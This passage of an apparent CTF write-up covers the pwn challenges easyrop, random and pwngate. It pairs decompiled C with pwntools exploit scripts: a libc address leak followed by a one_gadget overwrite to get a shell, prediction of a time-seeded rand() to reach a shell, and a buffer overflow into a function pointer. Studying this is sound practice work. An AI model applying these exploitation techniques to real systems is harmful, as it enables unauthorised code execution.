&#125;</span><br><span class="line"><span class="number">46</span>	  <span class="keyword">return</span>;</span><br><span class="line"><span class="number">47</span>	&#125;</span><br></pre></td></tr></table></figure>

<p>so function’s functionality is like</p>
<ul>
<li>provides to two options 1 and 2 for read and write sequentially </li>
<li>that takes index and content(number) to write </li>
<li>that being stored on variable local_208 corresponding to given index</li>
</ul>
<p>so bug spotted in line number 38 as we can see that variable <strong>local_208’s</strong> address being printed using %x format specifier, it seems that we may get libc address that will help us to calculate the base address, lets find out the offset </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./easyrop&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level  = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&quot;read!\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">300</span>):</span><br><span class="line">       <span class="keyword">if</span> i % <span class="number">3</span> != <span class="number">0</span>:</span><br><span class="line">           r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">           r.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">           <span class="built_in">print</span>(r.recvline())</span><br><span class="line">    </span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>using that <strong>if</strong> condition thing ‘cause of restriction we have in <code>get_index</code> function i.e.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">uint <span class="title function_">get_index</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  uint local_14;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  fwrite(<span class="string">&quot;Select index: &quot;</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00402017,&amp;local_14);</span><br><span class="line">  <span class="keyword">if</span> (local_14 % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope! Can\&#x27;t give u that one!&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> local_14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>and here we go! </p>
<p><img src="/imgs/post6/pwn/easy_rop_leak.png" alt="easy_rop_leak.png"></p>
<blockquote>
<p>address is printed in two half parts as we have seen in main function i.e. </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ulong)*(uint *)((<span class="type">long</span>)local_208 + (ulong)local_20c * <span class="number">4</span>));</span><br></pre></td></tr></table></figure>

<p>that is basically equivalent to local_208[i*4] </p>
<h4 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./easyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">conitnue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = conn() </span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;130&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot; is &quot;</span>)</span><br><span class="line">    leak2=io.recvline().strip()</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;131&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot; is &quot;</span>)</span><br><span class="line">    leak1=io.recvline().strip()</span><br><span class="line"></span><br><span class="line">    leak = <span class="built_in">int</span>(<span class="string">b&quot;0x&quot;</span>+leak1+leak2,<span class="number">16</span>) - <span class="number">0x2718a</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LEAK&quot;</span>,<span class="built_in">hex</span>(leak),leak1,leak2)</span><br><span class="line"></span><br><span class="line">    gadget = leak + <span class="number">0xebcf8</span> <span class="comment">#one_gadget</span></span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;130&quot;</span>)</span><br><span class="line">    pl=<span class="built_in">str</span>(gadget&amp;<span class="number">0x00000000ffffffff</span>)</span><br><span class="line">    io.sendline(pl.encode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;part1&quot;</span>,<span class="built_in">hex</span>(<span class="built_in">int</span>(pl)))</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;131&quot;</span>)</span><br><span class="line">    pl=<span class="built_in">str</span>(gadget&gt;&gt;<span class="number">32</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;part2&quot;</span>,<span class="built_in">hex</span>(<span class="built_in">int</span>(pl)))</span><br><span class="line">    io.sendline(pl.encode())</span><br><span class="line">    </span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.interactive() </span><br></pre></td></tr></table></figure>

<p>gadget&amp;0x00000000ffffffff and gadget&gt;&gt;32 is used to send the address in two half as it takes only 4 bytes at a time so first half lower bytes and then rest higher bytes sequentially</p>
<h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><h5 id="main-func-1"><a href="#main-func-1" class="headerlink" title="main func"></a>main func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">time_t</span> tVar2;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> j;</span><br><span class="line">  <span class="type">int</span> counter;</span><br><span class="line">  </span><br><span class="line">  setup();</span><br><span class="line">  tVar2 = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">  srand((uint)tVar2);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">    iVar1 = rand();</span><br><span class="line">    *(<span class="type">int</span> *)(v + (<span class="type">long</span>)i * <span class="number">4</span>) = iVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Guess my numbers!&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j = j + <span class="number">1</span>) &#123;</span><br><span class="line">    __isoc99_scanf(&amp;DAT_0010201e,input + (<span class="type">long</span>)j * <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  counter = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">9</span> &lt; counter) &#123;</span><br><span class="line">      win();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)(v + (<span class="type">long</span>)counter * <span class="number">4</span>) != *(<span class="type">int</span> *)(input + (<span class="type">long</span>)counter * <span class="number">4</span>)) <span class="keyword">break</span>;</span><br><span class="line">    counter = counter + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You didn\&#x27;t make it :(&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>function workflow :</p>
<ul>
<li>Loop1: generates 10 random integer values using the <code>rand</code> function and stores them in an array-like structure starting from the memory address <code>v</code>. The use of the <code>time</code> function to seed the random number generator ensures that each time the program is run, it produces a different sequence of random values.</li>
<li>Loop2: let user to guess numbers</li>
<li>Loop3: compare the user given number to random generated number one by one if each and every number that being generated randomly in first loop is equal to user guessed numbers that it will call the <code>win</code> function that contain spwan the shell</li>
</ul>
<p>so all we have to do is somehow generate the exact numbers that being generated by program</p>
<p>we can replicate the process in python using <strong>cytpes</strong> library</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> CDLL</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./random&#x27;</span>) </span><br><span class="line">libc = CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process()</span><br><span class="line"><span class="comment">#io = remote(&#x27;challs.tfcctf.com&#x27;,31094)</span></span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">nbs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    nbs.append(libc.rand())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Guess my numbers!\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> nbs:</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h3 id="pwngate"><a href="#pwngate" class="headerlink" title="pwngate"></a>pwngate</h3><p>this challenge is pretty fun to solve, lets disassemble the program and follow through each function </p>
<h5 id="main-func-2"><a href="#main-func-2" class="headerlink" title="main func"></a>main func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your current timeline is horrible.&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;In order to reach the Pwn;Gate you are ready to sacrifice everything...\n&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  setup();</span><br><span class="line">  current_leap();</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="menu-func"><a href="#menu-func" class="headerlink" title="menu func"></a>menu func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined4 local_11;</span><br><span class="line">  undefined local_d;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  fgets(timeline,<span class="number">0xf</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">      <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">        <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;\nWhat are you going to do?&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[1] Try to change the timeline&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[2] Time leap&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[3] Ensure your sanity&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[4] Remember who you are&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[5] Exit&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Enter choice: &quot;</span>);</span><br><span class="line">          local_11 = <span class="number">0</span>;</span><br><span class="line">          local_d = <span class="number">0</span>;</span><br><span class="line">          fgets((<span class="type">char</span> *)&amp;local_11,<span class="number">5</span>,<span class="built_in">stdin</span>);</span><br><span class="line">          local_c = atoi((<span class="type">char</span> *)&amp;local_11);</span><br><span class="line">          <span class="keyword">if</span> (local_c != <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">          divergence_meter();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (local_c != <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">        timeleap();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (local_c != <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> (leveling._0_4_ == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You are sane.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        sanity();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (local_c == <span class="number">5</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (local_c == <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (leveling._4_4_ == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You didn\&#x27;t play the game yet! :(&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        okabe();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Try again.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It’s just a menu of functions that allows you to navigate to each function within the program by selecting the corresponding number, lets see each function one by one </p>
<h5 id="divergence-meter-func"><a href="#divergence-meter-func" class="headerlink" title="divergence_meter func"></a>divergence_meter func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">divergence_meter</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> sVar1;</span><br><span class="line">  ulong uVar2;</span><br><span class="line">  undefined8 local_2f;</span><br><span class="line">  undefined4 local_27;</span><br><span class="line">  undefined2 local_23;</span><br><span class="line">  undefined local_21;</span><br><span class="line">  <span class="type">int</span> counter;</span><br><span class="line">  <span class="type">int</span> local_1c;</span><br><span class="line">  </span><br><span class="line">  local_2f = <span class="number">0</span>;</span><br><span class="line">  local_27 = <span class="number">0</span>;</span><br><span class="line">  local_23 = <span class="number">0</span>;</span><br><span class="line">  local_21 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Choose where to leap: &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;local_2f,<span class="number">15</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  local_1c = <span class="number">0</span>;</span><br><span class="line">  counter = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    uVar2 = SEXT48(counter);</span><br><span class="line">    sVar1 = <span class="built_in">strlen</span>((<span class="type">char</span> *)&amp;local_2f);</span><br><span class="line">    <span class="keyword">if</span> (sVar1 &lt;= uVar2) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">char</span> *)((<span class="type">long</span>)&amp;local_2f + (<span class="type">long</span>)counter) != <span class="string">&#x27;g&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((*(<span class="type">char</span> *)((<span class="type">long</span>)&amp;local_2f + (<span class="type">long</span>)counter) == <span class="string">&#x27;o&#x27;</span>) &amp;&amp; (local_1c != <span class="number">0</span>)) &#123;</span><br><span class="line">        local_1c = youdidwhat(local_1c);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        timeline[(<span class="type">long</span>)local_1c + <span class="number">16</span>] = *(undefined *)((<span class="type">long</span>)&amp;local_2f + (<span class="type">long</span>)counter);</span><br><span class="line">        local_1c = local_1c + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">8</span> &lt; local_1c) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    counter = counter + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This function <code>divergence_meter</code> reads user input, processing characters according to conditions, and stores them in the <code>timeline</code> array.</p>
<p>here in this function we have BOF in the <code>fgets</code> function <strong>local_2f</strong> local variable suppose to hold 8 byte of data but more than that has permitted and content from local_2f variable being copied to <strong>timeline</strong> variable and if we see in ghidra timeline is global variable </p>
<p><img src="/imgs/post6/pwn/pwngate1.png" alt="pwngate1.png"></p>
<p><img src="/imgs/post6/pwn/pwngate2.png" alt="pwngate2.png"></p>
<p>that also being used in other function as well, lets follow timeleap and <code>timeleap</code> and <code>current_leap</code> </p>
<h5 id="current-leap-func"><a href="#current-leap-func" class="headerlink" title="current_leap func"></a>current_leap func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">current_leap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  timeline._24_8_ = fate;</span><br><span class="line">  leveling._0_4_ = <span class="number">0</span>;</span><br><span class="line">  leveling._24_8_ = <span class="number">0</span>;</span><br><span class="line">  password();</span><br><span class="line">  leveling._4_4_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>okay so basically timeline is structure and this function assigns the function pointer <code>fate</code> to the <code>_24_8_</code> member of the <code>timeline</code> structure. and also sets the <code>_0_4_</code> , <code>_24_8_</code> and <code>_4_4_</code> members of the <code>leveling</code> structure to <code>0</code>.</p>
<p>hmm so here <code>timeline._24_8_</code> is working as function pointer and A function pointer is a variable that can store the memory address of a function. In this case, the code is setting the function pointer <code>timeline._24_8_</code> to point to the <code>fate</code> function. This allows you to call the <code>fate</code> function indirectly through the function pointer <code>timeline._24_8_</code>.</p>
<h5 id="timeleap-func"><a href="#timeleap-func" class="headerlink" title="timeleap func"></a>timeleap func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timeleap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You\&#x27;ve pressed the button... be ready for the leap!&quot;</span>);</span><br><span class="line">  sleep(<span class="number">0</span>);</span><br><span class="line">  (*timeline._24_8_)();</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>and that function pointer being called in this <code>timeleap</code> function that is <code>fate</code> function </p>
